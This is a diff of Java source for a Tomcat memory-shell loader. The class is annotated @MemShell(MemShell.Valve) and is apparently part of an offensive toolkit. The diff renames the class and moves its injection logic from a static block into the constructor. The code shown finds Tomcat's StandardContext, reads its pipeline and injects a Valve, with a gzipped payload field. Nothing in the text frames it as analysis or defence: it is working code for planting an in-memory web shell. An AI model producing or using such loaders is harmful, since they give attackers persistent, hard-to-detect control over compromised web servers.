@@ -19,14 +19,11 @@ import java.util.zip.GZIPInputStream;
 @MemShell(MemShell.Valve)
 @JavaClassType(JavaClassType.Default)
 @JavaClassModifiable({JavaClassModifiable.CLASSNAME})
-public class TomcatValveThreadLoader {
+public class TomcatAutoFindValveThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
 
-    public TomcatValveThreadLoader() {
-    }
-
-    static {
+    public TomcatAutoFindValveThreadLoader() {
         try {
             // 获取 standardContext
             Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
@@ -35,6 +32,11 @@ public class TomcatValveThreadLoader {
 
         }
     }
+
+    public TomcatAutoFindValveThreadLoader(Object o) {
+
+    }
+
     public static void inject(Object standardContext) {
         try {
             Object pipeline = getFieldValue(standardContext, "pipeline");
@@ -131,7 +133,7 @@ public class TomcatValveThreadLoader {
     }
 
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatValveThreadLoader().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new TomcatAutoFindValveThreadLoader(null).getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
